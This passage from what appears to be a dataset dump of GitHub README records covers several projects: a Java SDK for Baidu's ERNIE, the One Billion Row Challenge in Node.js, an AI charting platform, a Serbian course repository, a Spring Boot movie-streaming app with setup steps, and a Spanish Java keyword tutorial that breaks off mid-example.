2024-03-10 18:02:56 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064977,""sentence_id"":3,""is_end"":false,""is_truncated"":false,""result"":""如果您还有其他问题或需要更详细的信息，请随时告诉我。"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":29,""total_tokens"":718}}
2024-03-10 18:02:56 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064977,""sentence_id"":4,""is_end"":true,""is_truncated"":false,""result"":"""",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":42,""total_tokens"":731}}
根据您的要求，我已经使用[compute_avg_score]工具计算了李四的平均分。他的平均分是75.0分。如果您还有其他问题或需要更详细的信息，请随时告诉我。
```

在一次对话中，`qianfan4j`根据用户的需求，使用了`query_score`工具来查询李四的语文和数学成绩，分别是80分和70分， 
然后使用`compute_avg_score`工具来计算他们的语文平均分。最终，助手返回了李四的语文和数学平均分为75分。

### 文生图示例

`qianfan4j`会将文心一言返回的BASE64编码封装为`BufferedImage`类型，方便开发者进行后续的图像处理。
下面是一个简单的示例，展示了如何使用`qianfan4j`进行图像处理：

```java
final var request = GenerationImageRequest.newBuilder()
    .model(GenerationImageModel.STABLE_DIFFUSION_XL)
    .prompt(""猫"")
    .negative(""白色"")
    .option(GenerationImageOptions.NUMBERS, 2)
    .option(GenerationImageOptions.SIZE, GenerationImageRequest.Size.S_1024_1024)
    .build();

final var response = client.generationImage(request)
    .async()
    .join();
```

然后你就可以通过`response.images().get(0)`拿到生成的图片的`BufferedImage`类型进行后续操作了。

![文生图-猫](https://ompc-images.oss-cn-hangzhou.aliyuncs.com/erniebot4j/gen-image-as-mr0hyfmsix-001.png)

## 五、参与贡献

如果你对`qianfan4j`感兴趣并希望为其做出贡献，请遵循以下步骤：

1. Fork本项目到你的GitHub账户。
2. 克隆项目到你的本地环境。
3. 创建一个新的分支用于你的修改。
4. 提交你的更改并通过`Pull Request`请求合并到主分支。

在提交Pull Request之前，请确保你的代码符合项目的编码规范和最佳实践，并且已经通过了相关的测试。

## 六、特别致谢

首先，我要向百度千帆大模型团队的同学们表达我最深切地感谢。正是他们不懈的努力和卓越的工作成果，使得我们能够如此便捷地利用千帆的API使用文心一言在内的LLM大模型进行开发。
他们为整个开发者社区树立了榜样，推动了技术的进步。

### 关于文心一言

作为个人使用者，我对文心一言这个产品怀有极高地评价。相较于OpenAi的GPT-4，虽然在某些功能上还有待完善，但文心一言在稳定性方面展现出了显著的优势。
在实际应用中，它的可靠和稳定让我倍感信赖，这也是我选择它作为开发基础的重要原因之一。

同时我也希望在多模态的时代，千帆大模型平台和文心一言不要落后。

### 缘起与动机

当我得知千帆大模型发布了SDK时，我迫不及待地想要集成到我的项目中。然而，我遗憾地发现他们的SDK当时并不支持Java。
作为一个Java开发者，我深知Java在开发者社区中的普及程度和重要性。因此，我决定自己动手，填补这一空白，为Java开发者提供一个方便、易用的文心一言客户端。

正是在这样的背景下，我发起了`qianfan4j`项目。它旨在成为文心一言的Java开发者最佳伴侣，提供简洁明了的API接口，帮助开发者快速集成和使用文心一言的功能。
通过`qianfan4j`，Java开发者可以轻松地实现对话、续写、向量嵌入和图像处理等功能，极大地提升了开发效率和用户体验。

### 展望与呼吁

展望未来，我希望`qianfan4j`能够成为Java开发者与千帆大模型平台之间的桥梁，推动千帆和文心一言在更多领域的应用和发展。
同时，我也呼吁更多的开发者加入到`qianfan4j`的开源社区中来，共同完善和优化这个项目，让它更好地服务于整个开发者社区。

## 七、相关链接

- [千帆大模型平台](https://console.bce.baidu.com/qianfan/overview)",1,0,1,Apache-2.0
SudarshanShahCode/movieAPI-backend-YT,master,,0,0,1,
1brc/nodejs,main,"# 1️⃣🐝🏎️ The One Billion Row Challenge with Node.js

## About the Challenge

The One Billion Row Challenge (1BRC) is a fun exploration of how far modern Java can be pushed for aggregating one billion rows from a text file.

Later the community created a dedicated @1brc organization to pay more attention to the implementations in other languages. This repository contains and accepts Node.js based implementations.

Grab all your (virtual) threads, reach out to SIMD, optimize your GC, or pull any other trick, and create the fastest implementation for solving this task!

<img src=""1brc.png"" alt=""1BRC"" style=""display: block; margin-left: auto; margin-right: auto; margin-bottom:1em; width: 50%;"">

The text file contains temperature values for a range of weather stations.
Each row is one measurement in the format `<string: station name>;<double: measurement>`, with the measurement value having exactly one fractional digit.
The following shows ten rows as an example:

```
Hamburg;12.0
Bulawayo;8.9
Palembang;38.8
St. John's;15.2
Cracow;12.6
Bridgetown;26.9
Istanbul;6.2
Roseau;34.4
Conakry;31.2
Istanbul;23.0
```

The task is to write a program which reads the file, calculates the min, mean, and max temperature value per weather station, and emits the results on stdout like this
(i.e. sorted alphabetically by station name, and the result values per station in the format `<min>/<mean>/<max>`, rounded to one fractional digit):

```
{Abha=-23.0/18.0/59.2, Abidjan=-16.2/26.0/67.3, Abéché=-10.0/29.4/69.0, Accra=-10.1/26.4/66.4, Addis Ababa=-23.7/16.0/67.0, Adelaide=-27.8/17.3/58.5, ...}
```

Submit your implementation and become part of the leaderboard!

## Results

| #   | Result (m:s.ms) | Implementation                                                                        | Submitter                                        | Notes                                                                              |
| --- | --------------- | ------------------------------------------------------------------------------------- | ------------------------------------------------ | ---------------------------------------------------------------------------------- |
| 1.  | 00:23.000       | [link](https://github.com/1brc/nodejs/blob/main/src/main/nodejs/Edgar-P-yan/index.js) | [Edgar Pogosyan](https://github.com/Edgar-P-yan) | Multi-threaded, optimized parsing, input-specific `float` to `int` parser, no mmap |
|     | 06:16.000       | [link](https://github.com/1brc/nodejs/blob/main/src/main/nodejs/baseline/index.js)    | [Edgar Pogosyan](https://github.com/Edgar-P-yan) | The baseline, single threaded, naive implementation                                |

See [below](#entering-the-challenge) for instructions how to enter the challenge with your own implementation.

## Prerequisites

1. [Java 21](https://openjdk.org/projects/jdk/21/) to generate the `measurements.txt` files and optionally run tests.
2. Node.js, preferably via nvm (node version manager) must be installed on your system.

## Running the Challenge

This repository contains two programs:

- `dev.morling.onebrc.CreateMeasurements` (invoked via _create_measurements.sh_): Creates the file _measurements.txt_ in the root directory of this project with a configurable number of random measurement values
- `src/main/nodejs/baseline/index.js` (invoked via _calculate_average_baseline.sh_): Calculates the average values for the file _measurements.txt_

Execute the following steps to run the challenge:

1. Build the project using Apache Maven:

   ```
   ./mvnw clean verify
   ```

2. Create the measurements file with 1B rows (just once):

   ```
   ./create_measurements.sh 1000000000
   ```

   This will take a few minutes.
   **Attention:** the generated file has a size of approx. **12 GB**, so make sure to have enough diskspace.

3. Calculate the average measurement values:

   ```
   ./calculate_average_baseline.sh
   ```

   The provided naive example implementation uses the Node.js Streams for processing the file and completes the task in ~6m16s on environment used for [result evaluation](#evaluating-results).
   It serves as the base line for comparing your own implementation.

4. Optimize the heck out of it:

   Adjust the `src/main/nodejs/baseline/index.js` program to speed it up, in any way you see fit (just sticking to a few rules described below).
   Options include parallelizing the computation, memory-mapping different sections of the file concurrently, choosing and tuning the garbage collector, and much more.

## Flamegraph/Profiling

> TODO: add instructions on how to profile node.js programs

## Rules and limits

- No external library dependencies may be used
<!-- - Implementations must be provided as a single source file -->
- The computation must happen at application _runtime_, i.e. you cannot process the measurements file at _build time_
  and just bake the result into the binary
- Input value ranges are as follows:
  - Station name: non null UTF-8 string of min length 1 character and max length 100 bytes (i.e. this could be 100 one-byte characters, or 50 two-byte characters, etc.)
  - Temperature value: non null double between -99.9 (inclusive) and 99.9 (inclusive), always with one fractional digit
- There is a maximum of 10,000 unique station names
- Implementations must not rely on specifics of a given data set, e.g. any valid station name as per the constraints above and any data distribution (number of measurements per station) must be supported

## Entering the Challenge

To submit your own implementation to 1BRC, follow these steps:

- Create a fork of the [1brc/nodejs](https://github.com/1brc/nodejs/) GitHub repository.
- Create a copy of `src/main/nodejs/baseline` directory, rename it to `src/main/nodejs/<your_GH_user>`, e.g. `src/main/nodejs/JohnDoe`.
- Make that implementation fast. Really fast.
- Create a copy of _calculate_average_baseline.sh_, named _calculate_average\_<your_GH_user>.sh_, e.g. _calculate_average_JohnDoe.sh_.
- Adjust that script so that it references your implementation file. If needed, provide any Node.js/V8 runtime arguments.
  Make sure that script does not write anything to standard output other than calculation results.
- Run the test suite by executing _/test.sh <your_GH_user>_; if any differences are reported, fix them before submitting your implementation.
- Create a pull request against the upstream repository, clearly stating
  - The execution time of the program on your system and specs of the same (CPU, number of cores, RAM). This is for informative purposes only, the official runtime will be determined as described below.
- I will run the program and determine its performance as described in the next section, and enter the result to the scoreboard.

**Note:** I reserve the right to not evaluate specific submissions if I feel doubtful about the implementation (I.e. I won't run your Bitcoin miner ;).

<!-- If you'd like to discuss any potential ideas for implementing 1BRC with the community,
you can use the [GitHub Discussions](https://github.com/gunnarmorling/onebrc/discussions) of this repository.
Please keep it friendly and civil. -->

## Evaluating Results

For now results are determined by running the program on a Apple MacBook M1 32GB (10 physical).
The `time` program is used for measuring execution times, i.e. end-to-end times are measured.
Each contender will be run five times in a row.
The slowest and the fastest runs are discarded.
The mean value of the remaining three runs is the result for that contender and will be added to the results table above.
The exact same _measurements.txt_ file is used for evaluating all contenders.

<!-- If you'd like to spin up your own box for testing on Hetzner Cloud, you may find these [set-up scripts](https://github.com/gunnarmorling/cloud-boxes/) (based on Terraform and Ansible) useful.
It has been reported that instances of the CCX33 machine class can significantly vary in terms of performance,
so results are only comparable when obtained from one and the same instance.
Note this will incur cost you are responsible for, I am not going to pay your cloud bill :) -->

<!-- ## Prize

If you enter this challenge, you may learn something new, get to inspire others, and take pride in seeing your name listed in the scoreboard above.
Rumor has it that the winner may receive a unique 1️⃣🐝🏎️ t-shirt, too! -->

## FAQ

<!-- _Q: Can I use Kotlin or other JVM languages other than Java?_\
A: No, this challenge is focussed on Java only. Feel free to inofficially share implementations significantly outperforming any listed results, though.

_Q: Can I use non-JVM languages and/or tools?_\
A: No, this challenge is focussed on Java only. Feel free to inofficially share interesting implementations and results though. For instance it would be interesting to see how DuckDB fares with this task.

_Q: I've got an implementation—but it's not in Java. Can I share it somewhere?_\
A: Whilst non-Java solutions cannot be formally submitted to the challenge, you are welcome to share them over in the [Show and tell](https://github.com/gunnarmorling/1brc/discussions/categories/show-and-tell) GitHub discussion area.

_Q: Can I use JNI?_\
A: Submissions must be completely implemented in Java, i.e. you cannot write JNI glue code in C/C++. You could use AOT compilation of Java code via GraalVM though, either by AOT-compiling the entire application, or by creating a native library (see [here](https://www.graalvm.org/22.0/reference-manual/native-image/ImplementingNativeMethodsInJavaWithSVM/). -->

_Q: What is the encoding of the measurements.txt file?_\
A: The file is encoded with UTF-8.

_Q: Can I make assumptions on the names of the weather stations showing up in the data set?_\
A: No, while only a fixed set of station names is used by the data set generator, any solution should work with arbitrary UTF-8 station names
(for the sake of simplicity, names are guaranteed to contain no `;` character).

_Q: Can I copy code from other submissions?_\
A: Yes, you can. The primary focus of the challenge is about learning something new, rather than ""winning"". When you do so, please give credit to the relevant source submissions. Please don't re-submit other entries with no or only trivial improvements.

_Q: Which operating system is used for evaluation?_\
A: macOS Sonoma 14 (see [Evaluating Results](#evaluating-results))

_Q: My solution runs in 2 sec on my machine. Am I the fastest 1BRC-er in the world?_\
A: Probably not :) 1BRC results are reported in wallclock time, thus results of different implementations are only comparable when obtained on the same machine. If for instance an implementation is faster on a 32 core workstation than on the 8 core evaluation instance, this doesn't allow for any conclusions. When sharing 1BRC results, you should also always share the result of running the baseline implementation on the same hardware.

_Q: Why_ 1️⃣🐝🏎️ _?_\
A: It's the abbreviation of the project name: **One** **B**illion **R**ow **C**hallenge.

## License

This code base is available under the Apache License, version 2.

## Code of Conduct

Be excellent to each other!
More than winning, the purpose of this challenge is to have fun and learn something new.
",0,0,1,Apache-2.0
gitgg021/AI-Chart,master,"# AI数据可视化分析平台
 `作者 CaoCao 😄`
## 项目介绍 📢
本项目是基于React+Spring Boot+RabbitMQ+AIGC的智能BI数据分析平台。 

访问地址：http://www.huahuaguagua.top  

随着AIGC的发展，越来越多的领域可以引入人工智能来帮助我们实现一些任务。于是本项目应运而生。不同于传统的数据分析平台,当我们分析数据趋势时需人工导入数据，选择要分析的字段和图表，并由专业数据分析师进行分析。然而，本项目只需导入原始数据和你想要分析的目标, 系统将利用AI自动生成可视化图表和详细的分析结论，使得分析数据更加轻松。  
## 项目架构图 🔥 
### 基础架构
![image](https://github.com/gitgg021/AI-Chart/blob/master/images/1.png)

### 优化项目架构-异步化处理
![image](https://github.com/gitgg021/AI-Chart/blob/master/images/2.png)

## 项目功能 🎊  
### 已有功能
1. 用户登录、注册、注销。
2. 智能分析（同步）: 根据用户上传的 Excel 表格，分析诉求，图标名称，图标类型调用 AIGC 将分析结果可视化展示并且给出相关结论(为提升用户体验已关闭此功能，优化为异步调用)  
3. 智能分析（异步）: 用户提交 Excel 表格，分析诉求，图标名称，图标类型后，系统自动提交给后台处理，随后在我的图表页面进行显示可视化和分析结论。
### TODO 新增功能规划
1. 新增AI对话功能
2. 增加死信队列提升系统稳定性
## 主要工作🎊 : 
1. 后端自定义 Prompt 预设模版并封装用户输入的数据和分析诉求,通过对接AIGC接口智能生成可视化图
表json配置和分析结论,返回给前端渲染。
2. 由于AIGC的输入 Token 限制,使用 Easy Excel 解析用户上传的 XLSX 表格数据文件并压缩为 CSV , 实
测提高了将近20%的单次输入数据量,并节约了成本。
3. 为保证系统的安全性, 对用户上传的初始数据文件进行了后缀名,文件大小的多重校验
4. 为防止某用户恶意占用系统资源, 基于 Redisson 的 RateLimiter 实现分布式分流, 控制用户访问的频
率。
5. 由于 AIGC 的响应时间较长,基于自定义 IO 密集型线程池 + 任务队列实现了 AIGC 的并发执行和异步
化.支持更多用户排队而不是无限给系统压力导致 提交失败,同时提交任务后即可响应前端提升用户体验。
6. 由于本地任务队列重启丢失数据, 使用 RabbitMQ来接受并持久化任务消息,通过 Direct 交换机转发给
解耦的 AI 生成模块消费并处理任务, 提高了系统的可靠性。
## 项目技术栈🎊
### 后端  
Spring Boot 2.7.2  
MyBatis   
MyBatis Plus    
RabbitMQ  
讯飞星火API  
Swagger + Knife4j 项目文档  
Easy Excel  
 
### 前端
React  
Ant Design Pro    
Ant Design 组件库  
OpenAPI 代码生成  
EChart 图表生成  

### 数据存储
MySQL
### 部署上线
腾讯云   
宝塔Linux  
## 项目展示🎊
### 注册页
![image](https://github.com/gitgg021/AI-Chart/blob/master/images/10.png)
### 登录页
![image](https://github.com/gitgg021/AI-Chart/blob/master/images/11.png)
### 智能分析页
![image](https://github.com/gitgg021/AI-Chart/blob/master/images/12.png)
### 图表管理页
![image](https://github.com/gitgg021/AI-Chart/blob/master/images/13.png)
### 图表详情页
![image](https://github.com/gitgg021/AI-Chart/blob/master/images/14.png)
### 分页
![image](https://github.com/gitgg021/AI-Chart/blob/master/images/15.png)
### 查询页
![image](https://github.com/gitgg021/AI-Chart/blob/master/images/16.png)





",0,0,1,
lukaDoric/SOA,main,"# Servisno orijentisane arhitekture

<b>Obaveštenje:</b> Studenti koji su popunili formu za odbranu projekta za ocenu 7 treba da dođu u petak (14.06) u 09.00 u NTP 307.  
<b>Obaveštenje:</b> Odbrana za niže ocene će biti u nedelji 10. juna. Ako želite da izađete potrebno je da se upišete na sledeću <a href='https://forms.gle/7XPv3cy6VrZubGzu6'>formu</a> do 5. juna u 23:59:59. Nakon toga će biti objavljen tačan datum i satnica.  

Repozitorijum za materijale koji podržavaju izradu projekta iz predmeta ""Servisno orijentisane arhitekture"". Materijale treba koristiti u paraleli dok se radi na projektu jer definišu smernice za svaku nedelju rada na projektu.  
<a href='https://docs.google.com/document/d/1S25LongXcWjNz4SIsnHw2aSvQPwRmKYo5iXhV8sSUAs/edit'>Specifikacija projekta</a>.  
<a href='https://docs.google.com/presentation/d/1UZya8ywAeOozDKeEDMFS3IOJMcELQUzK/edit?rtpof=true&sd=true'>Uvodna prezentacija</a>.  
<a href='https://docs.google.com/spreadsheets/d/1IaycFUKvHsfi4cF8KV3DRMlh1QAr0VFRNddiYw0kuZs/edit#gid=0'>Spisak timova</a>.    

Materijali za prvi sprint se nalaze <a href='https://github.com/lukaDoric/SOA/blob/main/S1'>ovde</a>.  
Materijali za drugi sprint se nalaze <a href='https://github.com/lukaDoric/SOA/blob/main/S2'>ovde</a>.  
Materijali za treći sprint se nalaze <a href='https://github.com/lukaDoric/SOA/tree/main/S3'>ovde</a>.  
Materijali za četvrti sprint se nalaze <a href='https://github.com/lukaDoric/SOA/tree/main/S4'>ovde</a>.  
Materijali za peti sprint se nalaze <a href='https://github.com/lukaDoric/SOA/tree/main/S5'>ovde</a>.
",0,0,1,
ismael221/OpenStreamify,main,"
---

# OpenStreamify - Movie Streaming Application

## Description

This is a web application developed in **Spring Boot** for movie and series management and streaming. The application includes features like JWT-based authentication, OAuth2 login, **Spring MVC** for handling HTTP requests, and an access control system based on user permissions. Additionally, it supports movie and series streaming using **HLS (HTTP Live Streaming)**, notifications when a new movie or series is added, and a one-time password (OTP) system for secure password recovery.

### Features

- **User Authentication**:
   - JWT-based authentication for secure API access.
   - OAuth2 login options (Google, GitHub) for simplified access.
- **Movie and Series Management**:
   - Create, update, delete, and list movies and series with role-based access control.
   - Notifications for users when new movies or series are added.
- **Streaming**:
   - Video streaming in HLS format for both movies and series.
- **Password Recovery**:
   - OTP system for secure password recovery through email.
- **Caching and Messaging**:
   - **Redis** for caching frequently accessed data, improving response times.
   - **RabbitMQ** for asynchronous messaging, supporting high-scale processing.
- **Storage and Monitoring**:
   - **minIO** for video file storage.
   - **Grafana and Prometheus** for system monitoring and performance tracking.


## Technologies Used

- **Java**: Main programming language.
- **Spring Boot**: Framework used for developing the application.
- **Spring Security**: For authentication and authorization using JWT.
- **JWT (JSON Web Token)**: For secure API authentication.
- **Spring MVC**: For managing HTTP requests and routing.
- **HLS (HTTP Live Streaming)**: For video streaming.
- **Thymeleaf**: Template engine to render HTML pages.
- **ModelMapper**: For entity-to-DTO conversion.
- **Docker**: For containerizing the application and monitoring services.
- **MySQL**: Relational database used for storing movies and users data.
- **Redis**: Caching system for optimizing queries.
- **RabbitMQ**: Messaging system for inter-service communication.
- **Grafana**: Monitoring and analytics platform.
- **Prometheus**: Monitoring and alerting toolkit.
- **minIO**: Object storage used to store movie files.



## System Requirements

- **JDK 17** or later
- **Maven** 3.6+
- **MySQL** or any other relational database
- **Redis** (optional, but recommended for caching)
- **Docker** (to run RabbitMQ, Grafana, and Prometheus)
- **Postman** (to test the API endpoints)
- **FFmpeg** (To convert videos into .m3u8 and .ts segments)
- **minIO** (to store video files)

---

## Setup and Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/ismael221/OpenStreamify
   ```

2. Update your `application.yml` with the following configurations:

```yaml
spring:
  output:
    ansi:
      enabled: ALWAYS
  datasource:
    username: your db user
    password: your db password
    url: jdbc:mysql://localhost:3306/yourDatabase
  jpa:
    properties:
      hibernate:
        dialect: org.hibernate.dialect.MySQLDialect
        format_sql: true
    database-platform: org.hibernate.dialect.MySQLDialect
    hibernate:
      ddl-auto: update
      naming:
        physical-strategy: org.hibernate.boot.model.naming.PhysicalNamingStrategyStandardImpl
  servlet:
    multipart:
      enabled: true
      max-file-size: 6048MB
      max-request-size: 6048MB
  mail:
    host: ${SMTP_HOST}
    port: ${SMTP_PORT}
    username: ${SMTP_USER}
    password: ${SMTP_PASSWORD}
    properties:
      mail:
        smtp:
          auth: true
          starttls:
            enable: true
  redis:
    host: ${REDIS_HOST}
    port: ${REDIS_PORT}
    time-to-live: 1h
  rabbitmq:
    host: ${RABBIT_HOST}
    port: ${RABBIT_PORT}
    username: ${RABBIT_USERNAME}
    password: ${RABBIT_PASSWORD}
  resources:
    static-locations: file:videos/hls/
  security:
    oauth2:
      client:
        registration:
          github:
            client-id: ${GITHUB_CLIENTID}
            client-secret: ${GITHUB_CLIENTSECRET}
            scope:
              - user:email
              - user
          google:
            client-id: ${GOOGLE_CLIENTID}
            client-secret: ${GOOGLE_CLIENTSECRET}
            scope:
              - profile
              - email
api:
  security:
    token:
      secret: ${JWT_SECRET}

management:
  endpoints:
    web:
      exposure:
        include: '*'
  endpoint:
    prometheus:
      enabled: true

logging:
  level:
    root: DEBUG
    com.ismael.movie: ERROR
    org.hibernate.SQL: ERROR
    org.springframework.web: DEBUG

server:
  tomcat:
    max-swallow-size: -1
  url: ${SERVER_URL}
  port: ${SERVER_PORT}

minio:
  endpoint: ${MINIO_ENDPOINT}
  access-key: ${MINIO_ACCESSKEY}
  secret-key: ${MINIO_SECRETKEY}
  bucket:
    stream: ${MINIO_BUCKET}

TELEGRAM_BOT_TOKEN: ${TELEGRAM_BOT_TOKEN}
TELEGRAM_CHAT_ID: ${TELEGRAM_CHAT_ID}
```

### Environment Variables

Make sure to set up the following environment variables in your system or in a `.env` file:

- `SMTP_HOST`: SMTP server for email.
- `SMTP_PORT`: Port for SMTP.
- `SMTP_USER`: Username for SMTP authentication.
- `SMTP_PASSWORD`: Password for SMTP authentication.
- `REDIS_HOST`: Host for Redis server.
- `REDIS_PORT`: Port for Redis server.
- `RABBIT_HOST`: Host for RabbitMQ.
- `RABBIT_PORT`: Port for RabbitMQ.
- `RABBIT_USERNAME`: Username for RabbitMQ.
- `RABBIT_PASSWORD`: Password for RabbitMQ.
- `GITHUB_CLIENTID`: OAuth client ID for GitHub.
- `GITHUB_CLIENTSECRET`: OAuth client secret for GitHub.
- `GOOGLE_CLIENTID`: OAuth client ID for Google.
- `GOOGLE_CLIENTSECRET`: OAuth client secret for Google.
- `JWT_SECRET`: Secret key for JWT token encryption.
- `SERVER_URL`: Base URL for the server.
- `SERVER_PORT`: Port on which the server will run.
- `MINIO_ENDPOINT`: URL for minIO.
- `MINIO_ACCESSKEY`: Access key for minIO.
- `MINIO_SECRETKEY`: Secret key for minIO.
- `MINIO_BUCKET`: Bucket name for video storage in minIO.
- `TELEGRAM_BOT_TOKEN`: Token for Telegram bot.
- `TELEGRAM_CHAT_ID`: Chat ID for Telegram notifications
   

3. Start Redis (if using Docker):
   ```bash
   docker run -d --name redis -p 6379:6379 redis
   ```

4. Start RabbitMQ with the following command:
   ```bash
   docker run -it --rm --name rabbitmq -p 5672:5672 -p 15672:15672 rabbitmq:3.13-management
   ```

5. Configure **minIO** for storing video files. You can follow [this tutorial](https://www.digitalocean.com/community/tutorials/how-to-set-up-minio-object-storage-server-in-standalone-mode-on-ubuntu-20-04) to set up **minIO** on Ubuntu. For example, to start **minIO** on Docker:
   ```bash
   docker run -d -p 9000:9000 --name minio \
   -e ""MINIO_ACCESS_KEY=your_access_key"" \
   -e ""MINIO_SECRET_KEY=your_secret_key"" \
   minio/minio server /data
   ```

6. Run the project with the following command in the root directory:
   ```bash
   mvn spring-boot:run
   ```

7. Start Grafana and Prometheus in Docker containers by running:
   ```bash
   docker-compose up -d
   ```

8. Access the application in your browser:
   ```bash
   http://localhost:8080
   ```

9. Access Grafana for monitoring:
   ```bash
   http://localhost:3000
   ```
   - Username: `admin`
   - Password: `admin`

10. Access Prometheus to view collected data:
   ```bash
   http://localhost:9090
   ```

## Main Endpoints

### Authentication

- **POST** `/auth/register`: User registration.
- **POST** `/auth/login`: User authentication and JWT generation.

### Movies

- **GET** `/api/v1/movies`: Lists all movies.
- **POST** `/api/v1/movies`: Adds a new movie.
- **GET** `/api/v1/movies/{rid_movie}`: Retrieves details of a specific movie.
- **POST** `/api/v1/ratings`: Adds a review for a movie.

### Streaming

- **GET** `/api/v1/media/hls/{filename}.m3u8`: Streams the video using HLS based on the file name.


### Example of an Authenticated Request with JWT and OAuth2

All routes, except for login and registration, require authentication. The application supports two methods for authenticated requests:

1. **JWT Authentication**: Users can log in with username and password, receiving a JWT token in the response, which is stored as an HTTP-only cookie.
2. **OAuth2 Authentication**: Users can log in via OAuth2 providers (such as GitHub or Google), which returns an authentication cookie upon successful login.

#### JWT Authentication

When logging in with JWT, the server responds with a cookie named `access_token`, containing the JWT token. This cookie will be automatically sent with each request to protected routes.

To access protected routes with JWT authentication, ensure that the `access_token` cookie is included in your request headers. Alternatively, you may manually include the JWT token in the `Authorization` header as shown below.

### Login Request (JWT)

```http
POST /api/login
Content-Type: application/json

{
  ""username"": ""your-username"",
  ""password"": ""your-password""
}
```

### Swagger UI

To see all available endpoints and their descriptions, access Swagger UI:

http://localhost:8080/swagger-ui.html


## Project Structure

- `src/main/java/com/ismael/movies`: Contains the Java classes, including controllers, services, models, and repositories.
- `src/main/resources/templates`: Contains HTML pages rendered by Thymeleaf.
- `src/main/resources/static`: Contains static files like CSS and JavaScript.
- `src/main/resources/application.properties`: Application configuration.

## Security

The application uses **JWT tokens** and **OAuth2** for authentication and authorization. After logging in, the user receives a token or/and a cookie that must be included in the header of all subsequent requests to protected routes.

## Contributing

Contributions are welcome! Feel free to open an **issue** or submit a **pull request**.

## License

This project is licensed under the MIT License. See the [LICENSE](./LICENSE) file for more details.

---",0,0,3,MIT
Drako01/java-coderhouse--53330,main,"<p align=""center""> 
    <img src=""https://jobs.coderhouse.com/assets/logos_coderhouse.png"" alt=""CoderHouse""  height=""100""/>
</p>

# Bienvenidos a la Comisión #53330

<br><p align=""center"">
<img src=""https://1000logos.net/wp-content/uploads/2020/09/Java-Logo.png"" alt=""Java"" width=500></p>

<p align=""center""> 
 <a href=""https://www.w3.org/html/"" target=""_blank""> 
     <img src=""https://cdn.icon-icons.com/icons2/2699/PNG/512/mysql_official_logo_icon_169938.png"" alt=""sql"" height=""100""/></a> 
    &nbsp &nbsp
 <a href=""https://www.w3schools.com/css/"" target=""_blank""> 
 <img src=""https://miro.medium.com/v2/resize:fit:1100/0*5FEJ7emIEAxZRCQF"" alt=""spring-boot""  height=""100""/></a> 
</p>

---

## Entrega Final:

### El Proyecto Integrador debe incluir todos los temas vistos en el Curso:

<p align=""center""> 
 <img src=""./final-proyect/001.png"" alt=""sql"" width=""600""/>
  <img src=""./final-proyect/002.png"" alt=""sql"" width=""600""/>
   <img src=""./final-proyect/003.png"" alt=""sql"" width=""600""/>
    <img src=""./final-proyect/004.png"" alt=""sql"" width=""600""/>
     <img src=""./final-proyect/005.png"" alt=""sql"" width=""600""/>
      <img src=""./final-proyect/006.png"" alt=""sql"" width=""600""/>

</p>


----

## Tips Importantes:

Exploraremos conceptos fundamentales en Java que son esenciales para comprender y escribir programas efectivos. Estos conceptos son básicos pero críticos para cualquier estudiante de Java, ya que forman la base sobre la cual se construyen programas más complejos y sofisticados. Los términos que abordaremos incluyen public, static, void, private y más. Comencemos desglosando cada uno de estos términos.

1. public
 es un modificador de acceso que se aplica a clases, métodos y variables. Cuando un miembro de una clase se declara como public, está disponible para su acceso desde cualquier otra clase. Es decir, se puede acceder a él desde fuera de la clase donde está definido.

Ejemplo:
```
public class MiClase {
    public int miVariablePublica;
    public void miMetodoPublico() {
        // Código del método
    }
}
```

2. private
 es otro modificador de acceso. Cuando un miembro de una clase se declara como private, solo es accesible dentro de la misma clase. Esto significa que otros objetos o clases no pueden acceder directamente a este miembro.

Ejemplo:
```
public class MiClase {
    private int miVariablePrivada;
    private void miMetodoPrivado() {
        // Código del método
    }
}
```

3. static
 es una palabra clave utilizada para crear campos o métodos que pertenecen a la clase en sí, en lugar de pertenecer a instancias individuales de la clase. Los miembros static se pueden acceder sin la necesidad de crear una instancia de la clase.

Ejemplo:
```
public class MiClase {
    public static int miVariableEstatica;
    public static void miMetodoEstatico() {
        // Código del método
    }
}
```

4. void
 es una palabra clave utilizada para indicar que un método no devuelve ningún valor. Cuando un método tiene un tipo de retorno void, significa que el método realiza ciertas acciones pero no devuelve ningún valor al llamador.

Ejemplo:
```
public class MiClase {
    public void metodoQueNoDevuelveNada() {
        // Código del método
    }
}
```

5. main
 es el punto de entrada para la ejecución de un programa Java. Es el método que se ejecuta cuando se inicia un programa Java y su firma debe ser exactamente como sigue:


```
public static void main(String[] args)
```
Aquí, public indica que el método es accesible desde cualquier otra clase, static indica que el método pertenece a la clase en sí y no a instancias individuales de la clase, void indica que el método no devuelve ningún valor y String[] args es un parámetro que permite pasar argumentos al programa.

Estos conceptos son fundamentales en Java y proporcionan la base para comprender cómo se estructuran y comportan los programas en este lenguaje de programación. Dominar estos conceptos es esencial para cualquier estudiante de Java que desee escribir programas eficientes y bien estructurados.

6. class
 es una palabra clave utilizada para definir una nueva clase en Java. Una clase es un plano, una plantilla o un molde a partir del cual se pueden crear objetos. Define las propiedades (campos) y comportamientos (métodos) comunes a todos los objetos de ese tipo.

Ejemplo:
```
public class MiClase {
    // Campos y métodos de la clase
}
```

7. new
 es una palabra clave utilizada para crear una nueva instancia de una clase. Reserva memoria para el nuevo objeto y llama al constructor de la clase para inicializarlo.

Ejemplo:
```
MiClase objeto = new MiClase();
```

8. return
 es una palabra clave utilizada dentro de un método para devolver un valor al código que llamó al método. Marca el final del método y puede devolver un valor del tipo especificado en la firma del método, si corresponde.

Ejemplo:
```
public int sumar(int a, int b) {
    return a + b;
}
```

9. this
 es una palabra clave que se refiere a la instancia actual de la clase. Se utiliza para diferenciar entre los campos de la clase y los parámetros de los métodos o constructores cuando tienen el mismo nombre.

Ejemplo:
```
public class Persona {
    private String nombre;
    
    public Persona(String nombre) {
        this.nombre = nombre;
    }
}
```

10. final
 es una palabra clave que se puede aplicar a una clase, método o variable. Cuando se aplica a una clase, indica que la clase no puede ser subclaseada. Cuando se aplica a un método, indica que el método no puede ser sobrescrito. Cuando se aplica a una variable, indica que su valor no puede cambiar después de la inicialización.

Ejemplo:
```
public final class MiClaseFinal {
    // Contenido de la clase
}

public class OtraClase {
    public final void metodoFinal() {
        // Código del método
    }
}

public class Ejemplo {
    public final int VALOR = 10;
